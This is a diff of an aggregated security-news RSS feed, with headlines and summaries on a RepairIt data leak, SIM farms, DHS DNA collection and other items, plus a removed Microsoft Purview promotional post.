+&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/1minai-pro-plan-lifetime-subscription/"&gt;This $30 Subscription Will Bring AI Into Your Business&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4248378</guid><category>Artificial Intelligence</category><category>Tech &amp; Work</category><category>TR Academy</category><category>1minai tool</category><category>artificial intelligence</category><category>artificial intelligence tool</category></item><item><title>Security Breaches Found in AI-Powered Repair Tool Wondershare RepairIt</title><link>https://www.techrepublic.com/article/repairit-security-breach/</link><description>&lt;p&gt;Trend Micro reveals that RepairIt "contradicted its privacy policy by collecting, storing, and, due to weak Development, Security, and Operations practices, inadvertently leaking private user data."&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/repairit-security-breach/"&gt;Security Breaches Found in AI-Powered Repair Tool Wondershare RepairIt&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4328681</guid><category>Artificial Intelligence</category><category>Big Data</category><category>Cloud Security</category><category>News</category><category>Security</category><category>Storage</category><category>ai</category><category>cybersecurity</category><category>Wondershare RepairIt</category></item><item><title>Security Breaches Found in AI-Powered Repair Tool Wondershare RepairIt</title><link>https://www.techrepublic.com/article/repairit-security-breach/</link><description>&lt;p&gt;Trend Micro reveals that RepairIt "contradicted its privacy policy by collecting, storing, and, due to weak Development, Security, and Operations practices, inadvertently leaking private user data."&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/repairit-security-breach/"&gt;Security Breaches Found in AI-Powered Repair Tool Wondershare RepairIt&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4328681</guid><category>Artificial Intelligence</category><category>Big Data</category><category>Cloud Security</category><category>News</category><category>Security</category><category>Storage</category><category>ai</category><category>cybersecurity</category><category>Wondershare RepairIt</category></item><item><title>Anthropic’s Claude Sonnet 4.5 Can Code Autonomously for 30+ Hours</title><link>https://www.techrepublic.com/article/news-anthropic-claude-sonnet-45/</link><description>&lt;p&gt;Anthropic may be using its specialization in coding and STEM as a differentiator in the buzzy frontier model market. &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-anthropic-claude-sonnet-45/"&gt;Anthropic&amp;#8217;s Claude Sonnet 4.5 Can Code Autonomously for 30+ Hours&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4329299</guid><category>Artificial Intelligence</category><category>Developer</category><category>News</category></item><item><title>Trump Weighs Tariffs to Force 1:1 US Chip Output</title><link>https://www.techrepublic.com/article/news-trump-chip-tariffs-one-to-one-balance-foreign-reliance/</link><description>&lt;p&gt;White House weighs tariffs tied to a 1:1 balance between US-made and imported chips, aiming to cut foreign reliance and test Trump’s truce with tech.&lt;/p&gt;
@@ -4687,7 +4813,7 @@ uint32_t Compress(void* pointer) { return (intptr_t)pointer &amp;amp; 0xffffffff
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-10 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-12 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://go.microsoft.com/fwlink/?linkid=2336417" rel="noreferrer noopener" target="_blank"&gt;Download the full Cyberattack report&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -4809,7 +4935,7 @@ uint32_t Compress(void* pointer) { return (intptr_t)pointer &amp;amp; 0xffffffff
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-11 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-13 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/blog/feed/#https://go.microsoft.com/fwlink/?linkid=2336417" rel="noreferrer noopener" target="_blank"&gt;Download the full Cyberattack report&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -5583,204 +5709,7 @@ Development Experience of several years and in multiple APT Groups.&lt;/p&gt;
 &lt;p&gt;Found on &lt;a href="https://boingboing.net/2025/09/19/a-url-shortener-that-creates-suspicious-looking-urls.html"&gt;Boing Boing&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;a href="https://phishyurl.com/"&gt;This site&lt;/a&gt; turns your URL into something sketchy-looking.&lt;/p&gt;
 &lt;p&gt;For example, &lt;tt&gt;www.schneier.com&lt;/tt&gt; becomes&lt;br /&gt;
 &lt;tt&gt;https://cheap-bitcoin.online/firewall-snatcher/cipher-injector/phishing_sniffer_tool.html?form=inject&amp;amp;host=spoof&amp;amp;id=bb1bc121&amp;amp;parameter=inject&amp;amp;payload=%28function%28%29%7B+return+%27+hi+%27.trim%28%29%3B+%7D%29%28%29%3B&amp;amp;port=spoof&lt;/tt&gt;.&lt;/p&gt;
-&lt;p&gt;Found on &lt;a href="https://boingboing.net/2025/09/19/a-url-shortener-that-creates-suspicious-looking-urls.html"&gt;Boing Boing&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70859</guid><category>Uncategorized</category><category>phishing</category><category>spoofing</category></item><item><title>‘SIM Farms’ Are a Spam Plague. A Giant One in New York Threatened US Infrastructure, Feds Say</title><link>https://www.wired.com/story/sim-farm-new-york-threatened-us-infrastructure-feds-say/</link><description>The agency says it found a network of some 300 servers and 100,000 SIM cards—enough to knock out cell service in the NYC area. Experts say it mirrors facilities typically used for cybercrime.</description><guid isPermaLink="false">68d2ae890be383c73029619e</guid><category>Security</category><category>Security / National Security</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>Crime</category><category>Spam</category><category>fraud</category><category>national security</category><category>Bad Connection</category></item><item><title>Microsoft Purview delivered 30% reduction in data breach likelihood</title><link>https://www.microsoft.com/en-us/security/blog/2025/09/23/microsoft-purview-delivered-30-reduction-in-data-breach-likelihood/</link><description>&lt;p&gt;A recent Total Economic Impact™ (TEI) Of Microsoft Purview study by Forrester Consulting, commissioned by Microsoft, offers valuable insights into how organizations are modernizing their data protection strategies. The study covers the tangible benefits of unifying data security, data governance and data compliance under a single platform—an approach exemplified by Microsoft Purview. &lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/09/23/microsoft-purview-delivered-30-reduction-in-data-breach-likelihood/"&gt;Microsoft Purview delivered 30% reduction in data breach likelihood&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p class="wp-block-paragraph"&gt;In today’s digital-first world, data is both an asset and a liability. As organizations scale their use of cloud platforms, AI, and remote collaboration tools, the complexity of managing data security, data privacy, and regulatory compliance grows exponentially. For organizations, the challenge is no longer just about preventing data breaches—it’s about enabling secure, compliant, and intelligent data use across the enterprise.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph" id="back"&gt;A recent &lt;a href="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/mccs-ms-purview-final-9-3.pdf" rel="noreferrer noopener" target="_blank"&gt;Total Economic Impact™ (TEI) of Microsoft Purview study by Forrester Consulting&lt;/a&gt;, commissioned by Microsoft, offers valuable insights into how organizations are modernizing their data protection strategies.&lt;sup&gt;1&lt;/sup&gt; The study covers the tangible benefits of unifying data security, data governance, and data compliance &lt;a href="https://www.microsoft.com/en-us/security/business/solutions/data-security-governance" rel="noreferrer noopener" target="_blank"&gt;under a single platform&lt;/a&gt;—an approach exemplified by &lt;a href="https://www.microsoft.com/en-us/security/business/microsoft-purview?msockid=27b7b3bc5be566bc06c9a5a05a7a679d" rel="noreferrer noopener" target="_blank"&gt;Microsoft Purview&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-12 wp-block-buttons-is-layout-flex"&gt;
-&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/business/microsoft-purview" rel="noreferrer noopener" target="_blank"&gt;Secure and govern your data with Microsoft Purview&lt;/a&gt;&lt;/div&gt;
-&lt;/div&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="why-data-security-is-a-strategic-imperative"&gt;Why data security is a strategic imperative&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;In an era where data is the lifeblood of digital operations, the importance of securing that data cannot be overstated. Organizations are increasingly reliant on data to drive decision-making, customer engagement, and innovation. However, this reliance also makes them prime targets for cyberattacks, insider threats, and accidental data leaks. The complexity of hybrid and multi-cloud environments further complicates visibility and control, making a unified data security strategy essential.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph" id="back11"&gt;Moreover, regulatory bodies around the world are tightening data protection laws, such as General Data Protection Regulation (GDPR), Health Insurance Portability and Accountability Act (HIPAA), and the California Consumer Privacy Act (CCPA). Non-compliance can result in hefty fines and reputational damage. For organizations, this means that data security is not just a technical requirement but a business-critical function that supports organizational resilience and trust.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The composite organization in the study faces a 70% annual likelihood of experiencing a data breach, with potential costs exceeding $3.3 million. Yet many enterprises still operate with fragmented tools, manual processes, and limited visibility into where sensitive data resides or how it’s accessed. This lack of visibility increases the risk of insider threats, non-compliance, and operational inefficiencies.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;For organizations, this means more time spent reacting to incidents, less time &lt;a href="https://www.microsoft.com/en-us/security/business/solutions/privacy-risk-management" rel="noreferrer noopener" target="_blank"&gt;proactively managing risk&lt;/a&gt;, and slower access to trusted data, hindering digital transformation.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Symbols showing ROI of 355%, Benefits PV of $3.0M, NPV of $2.3M, and Payback of 6 months." class="wp-image-142311 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Symbols-showing-ROI-of-355-Benefits-PV-of-3.0M-NPV-of-2.3M-and-Payback-of-6-months-1024x288.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure description:&amp;nbsp;Key findings from the Total&amp;nbsp;Exon that&amp;nbsp;is based on the interviews found that a composite organization experiences benefits of $3.0 million over three years versus costs of $633,000, adding up to a net present value (NPV) of $2.3 million and a return on investment (ROI) of 355%.&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="key-areas-of-impact"&gt;Key areas of impact&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;These areas of impact are not isolated; they are interconnected and reinforce one another. For example, improved data classification enhances both breach prevention and compliance automation. Similarly, streamlined investigations reduce the time to respond to incidents, which in turn minimizes potential damage and supports regulatory reporting requirements.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="1-data-breach-prevention-and-risk-reduction"&gt;&lt;strong&gt;1. Data breach prevention and risk reduction&lt;/strong&gt;&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The 2025 Forrester TEI study of Purview found that organizations achieved a 30% reduction in the likelihood of data breaches by implementing fine-tuned &lt;a href="https://www.microsoft.com/en-us/security/business/information-protection/microsoft-purview-data-loss-prevention" rel="noreferrer noopener" target="_blank"&gt;data loss prevention (DLP)&lt;/a&gt; policies and gaining visibility into sensitive data across clouds, devices, and applications. This translated into more than $225,000 in annual savings from avoided security incidents and regulatory fines.&lt;/p&gt;
-
-
-
-&lt;blockquote class="wp-block-quote has-quote-default-font-size is-layout-flow wp-block-quote-is-layout-flow"&gt;
-&lt;p class="wp-block-paragraph"&gt;Purview helps us determine our data loss prevention (DLP) rules. Now we get alerts to any possible threats to data loss for our privileged information.&lt;/p&gt;
-&lt;cite&gt;—Interviewee, Global Risk and Compliance Director, Food Processing Organization&lt;/cite&gt;&lt;/blockquote&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="2-streamlined-security-investigations"&gt;&lt;strong&gt;2. Streamlined security investigations&lt;/strong&gt;&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Security teams reduced investigation time by 75%, freeing up resources to focus on higher-value tasks. With centralized audit logs, automated alerts, and machine learning-informed policies, teams could detect and respond to cyberthreats faster and more effectively.&lt;/p&gt;
-
-
-
-&lt;blockquote class="wp-block-quote has-quote-default-font-size is-layout-flow wp-block-quote-is-layout-flow"&gt;
-&lt;p class="wp-block-paragraph"&gt;With Purview, we get alerts for those types of activities so my team and I are notified and can investigate them further.&lt;/p&gt;
-&lt;cite&gt;—Chief Commercial Officer, Financial Services&lt;/cite&gt;&lt;/blockquote&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="3-user-productivity-gains"&gt;&lt;strong&gt;3. User productivity gains&lt;/strong&gt;&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Users saved 75% of the time previously spent searching for and classifying data. With automated data classification and centralized access, employees could find the data they needed without relying on manual tagging or risking non-compliance.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Compliance teams benefit from simplification of previously manual data classification, compliance, and audit tasks.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="4-compliance-automation-and-audit-readiness"&gt;&lt;strong&gt;4. Compliance automation and audit readiness&lt;/strong&gt;&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Compliance teams reduced manual effort by 60%, thanks to tools that automated classification, retention, and audit workflows. This not only improved regulatory compliance but also elevated the role of compliance from a cost center to a strategic enabler of business agility.&lt;/p&gt;
-
-
-
-&lt;blockquote class="wp-block-quote has-quote-default-font-size is-layout-flow wp-block-quote-is-layout-flow"&gt;
-&lt;p class="wp-block-paragraph"&gt;Our records and information management team has gone from being stuck in the corner to now where we get invited to strategic planning meetings.&lt;/p&gt;
-&lt;cite&gt; —Records and Information Management Lead, Government&lt;/cite&gt;&lt;/blockquote&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="5-legacy-cost-avoidance"&gt;&lt;strong&gt;5. Legacy cost avoidance&lt;/strong&gt;&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;By consolidating data security and governance tools, organizations eliminated redundant systems and infrastructure, saving nearly $500,000 over three years. This simplification also reduced IT complexity and improved system interoperability.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="cultural-and-strategic-benefits"&gt;Cultural and strategic benefits&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Organizations interviewed in the study also reported a cultural shift where data security became a shared responsibility rather than a siloed function. This cultural evolution is critical in fostering a proactive security posture. Employees began to see themselves as stewards of data, leading to more mindful data handling practices and fewer accidental breaches.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Strategically, this shift enabled security and compliance teams to participate in broader business planning. Their insights into data usage and risk became valuable inputs for product development, customer engagement strategies, and operational improvements.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Beyond the numbers, organizations reported a shift in culture and strategy. Security and compliance teams became more integrated with business units. Users became more engaged in protecting data. And leadership gained confidence in their ability to support innovation without compromising security.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="the-role-of-unified-information-governance"&gt;The role of unified information governance&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Unified information governance simplifies the management of data across its lifecycle—from creation and storage to sharing and deletion. It ensures that policies are consistently applied, reducing the risk of human error and policy drift. This consistency is particularly important in large organizations with diverse teams and global operations.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;By integrating governance with security and compliance, organizations can create a more agile data environment. This agility supports faster innovation cycles, as teams can access the data they need without compromising on security or compliance.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;A key takeaway from the Total Economic Impact™ (TEI) study is the importance of unified information governance. By consolidating data classification, access control, and compliance monitoring into a single platform, organizations can reduce risk, improve efficiency, and unlock new business value.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Solutions like &lt;a href="https://www.microsoft.com/en-us/security/business/microsoft-purview" rel="noreferrer noopener" target="_blank"&gt;Microsoft Purview&lt;/a&gt; exemplify this unified approach. While not the only option, it demonstrates how integrating data security, compliance, and governance into a single ecosystem can yield measurable business outcomes into a single ecosystem can yield measurable business outcomes.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="next-steps-for-your-organization"&gt;Next steps for your organization&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;If you’re looking to &lt;a href="https://www.microsoft.com/en-us/security/business/solutions/data-security-governance" rel="noreferrer noopener" target="_blank"&gt;modernize your data security and governance strategy&lt;/a&gt;, here are three actionable steps: &lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Protect and govern your data estate&lt;/strong&gt;: Conduct a thorough assessment of your current data landscape to identify and classify sensitive data across your organization.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Safeguard your data for AI innovation&lt;/strong&gt;: Protect sensitive data used in all applications by implementing encryption and rights management controls.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;strong&gt;Support compliance and regulatory requirements&lt;/strong&gt;: Stay up to date with evolving regulatory requirements. &lt;a href="https://www.microsoft.com/en-us/security/business/risk-management/microsoft-purview-compliance-manager" rel="noreferrer noopener" target="_blank"&gt;Microsoft Purview Compliance Manager&lt;/a&gt; helps you to stay current with regulations and certifications, and reporting to auditors.&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-13 wp-block-buttons-is-layout-flex"&gt;
-&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link has-text-align-center wp-element-button" href="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/mccs-ms-purview-final-9-3.pdf" rel="noreferrer noopener" target="_blank"&gt;Read the full Total Economic Impact™ (TEI) study by Forrester&lt;/a&gt;&lt;/div&gt;
-&lt;/div&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;To learn more about Microsoft Security solutions, visit our &lt;a href="https://www.microsoft.com/en-us/security/business" rel="noreferrer noopener" target="_blank"&gt;website.&lt;/a&gt; Bookmark the &lt;a href="https://www.microsoft.com/security/blog/"&gt;Security blog&lt;/a&gt; to keep up with our expert coverage on security matters. Also, follow us on LinkedIn (&lt;a href="https://www.linkedin.com/showcase/microsoft-security/" rel="noreferrer noopener" target="_blank"&gt;Microsoft Security&lt;/a&gt;) and X (&lt;a href="https://twitter.com/@MSFTSecurity" rel="noreferrer noopener" target="_blank"&gt;@MSFTSecurity&lt;/a&gt;) for the latest news and updates on cybersecurity.&lt;/p&gt;
-
-
-
-&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;*Total Economic Impact is a methodology developed by Forrester Research that enhances a company’s technology decision-making processes and assists solution providers in communicating their value proposition to clients. The TEI methodology helps companies demonstrate, justify, and realize the tangible value of business and technology initiatives to both senior management and other key stakeholders. Results are for a composite organization based on interviewed customers.  &lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;em&gt;&lt;sup&gt;1&lt;/sup&gt;The financial results calculated in the Benefits and Costs sections can be used to determine the return on investment (ROI), net present value (NPV), and payback period for the composite organization’s investment. Forrester assumes a yearly discount rate of 10% for this analysis.  &lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;em&gt;These risk-adjusted ROI, NPV, and payback period values are determined by applying risk-adjustment factors to the unadjusted results in each Benefit and Cost section.  &lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;em&gt;The initial investment column contains costs incurred at “time 0” or at the beginning of Year 1 that are not discounted. All other cash flows are discounted using the discount rate at the end of the year. Present value (PV) calculations are calculated for each total cost and benefit estimate. NPV calculations in the summary tables are the sum of the initial investment and the discounted cash flows in each year. Sums and present value calculations of the Total Benefits, Total Costs, and Cash Flow tables may not exactly add up, as some rounding may occur.  &lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/09/23/microsoft-purview-delivered-30-reduction-in-data-breach-likelihood/"&gt;Microsoft Purview delivered 30% reduction in data breach likelihood&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.microsoft.com/en-us/security/blog/?p=142310</guid></item><item><title>DHS Has Been Collecting US Citizens’ DNA for Years</title><link>https://www.wired.com/story/dhs-has-been-collecting-us-citizens-dna-for-years/</link><description>Newly released data shows Customs and Border Protection funneled the DNA of nearly 2,000 US citizens—some as young as 14—into an FBI crime database, raising alarms about oversight and legality.</description><guid isPermaLink="false">68d1ced6274299fc2f9b2de1</guid><category>Security</category><category>Security / Privacy</category><category>Security / National Security</category><category>Security / Security News</category><category>Politics / Policy</category><category>Department of Homeland Security</category><category>immigration</category><category>Crime</category><category>Police</category><category>FBI</category><category>privacy</category><category>surveillance</category><category>DNA</category><category>Downward Spiral</category></item><item><title>Steps to TruRisk™ – 5: Eliminate Risk and Lead with Confidence</title><link>https://blog.qualys.com/category/product-tech/vulnmgmt-detection-response</link><description>“We shall not fail or falter; we shall not weaken or tire&amp;#8230; Give us the tools and we will finish the job.” – Winston Churchill&amp;#160; Every security team knows this truth: you can’t patch everything, and you can’t necessarily protect everything. Perfection is rare, but decisive execution can change outcomes. With the right team and [&amp;#8230;]</description><content:encoded>&lt;p&gt;&lt;strong&gt;&lt;em&gt;“We shall not fail or falter; we shall not weaken or tire&amp;#8230; Give us the tools and we will finish the job.”&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;– Winston Churchill&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;Found on &lt;a href="https://boingboing.net/2025/09/19/a-url-shortener-that-creates-suspicious-looking-urls.html"&gt;Boing Boing&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70859</guid><category>Uncategorized</category><category>phishing</category><category>spoofing</category></item><item><title>‘SIM Farms’ Are a Spam Plague. A Giant One in New York Threatened US Infrastructure, Feds Say</title><link>https://www.wired.com/story/sim-farm-new-york-threatened-us-infrastructure-feds-say/</link><description>The agency says it found a network of some 300 servers and 100,000 SIM cards—enough to knock out cell service in the NYC area. Experts say it mirrors facilities typically used for cybercrime.</description><guid isPermaLink="false">68d2ae890be383c73029619e</guid><category>Security</category><category>Security / National Security</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>Crime</category><category>Spam</category><category>fraud</category><category>national security</category><category>Bad Connection</category></item><item><title>DHS Has Been Collecting US Citizens’ DNA for Years</title><link>https://www.wired.com/story/dhs-has-been-collecting-us-citizens-dna-for-years/</link><description>Newly released data shows Customs and Border Protection funneled the DNA of nearly 2,000 US citizens—some as young as 14—into an FBI crime database, raising alarms about oversight and legality.</description><guid isPermaLink="false">68d1ced6274299fc2f9b2de1</guid><category>Security</category><category>Security / Privacy</category><category>Security / National Security</category><category>Security / Security News</category><category>Politics / Policy</category><category>Department of Homeland Security</category><category>immigration</category><category>Crime</category><category>Police</category><category>FBI</category><category>privacy</category><category>surveillance</category><category>DNA</category><category>Downward Spiral</category></item><item><title>Steps to TruRisk™ – 5: Eliminate Risk and Lead with Confidence</title><link>https://blog.qualys.com/category/product-tech/vulnmgmt-detection-response</link><description>“We shall not fail or falter; we shall not weaken or tire&amp;#8230; Give us the tools and we will finish the job.” – Winston Churchill&amp;#160; Every security team knows this truth: you can’t patch everything, and you can’t necessarily protect everything. Perfection is rare, but decisive execution can change outcomes. With the right team and [&amp;#8230;]</description><content:encoded>&lt;p&gt;&lt;strong&gt;&lt;em&gt;“We shall not fail or falter; we shall not weaken or tire&amp;#8230; Give us the tools and we will finish the job.”&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;– Winston Churchill&amp;nbsp;&lt;/p&gt;
 
 
 
